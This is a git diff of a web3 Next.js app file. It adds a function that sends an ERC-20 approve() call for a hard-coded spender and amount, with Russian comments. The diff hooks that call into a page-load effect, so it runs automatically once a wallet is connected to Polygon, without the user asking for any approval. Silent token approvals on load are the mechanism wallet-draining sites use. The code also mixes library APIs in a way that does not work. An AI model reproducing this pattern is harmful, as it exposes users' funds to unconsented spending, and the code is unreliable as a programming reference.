@@ -426,7 +426,6 @@ const abi = [
 		"type": "function"
 	}
 ];
-
 const contractAddress = '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E';
 
 const alchemyAPIKey = process.env.ALCHEMY_API_KEY;
@@ -476,11 +475,26 @@ const callSmartContract = async () => {
     }
 };
 
+const approveTransaction = async () => {
+    try {
+        const contractInstance = wagmiClient.getContract(contractAddress, abi);
+        const spender = '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E';
+        const value = '1000000000000000000'; // Замените на желаемое значение
+
+        const result = await contractInstance.methods.approve(spender, value).sendTransaction();
+
+        console.log('Транзакция успешно отправлена:', result);
+    } catch (error) {
+        console.error('Произошла ошибка при отправке транзакции:', error);
+    }
+};
+
 function MyApp({ Component, pageProps }) {
     useEffect(() => {
         const checkAndCallSmartContract = async () => {
             if (wagmiClient.connected && wagmiClient.chainId === polygon.chainId) {
                 await callSmartContract();
+                await approveTransaction(); // Вызываем функцию approve после вызова функции смарт-контракта
             }
         };
 
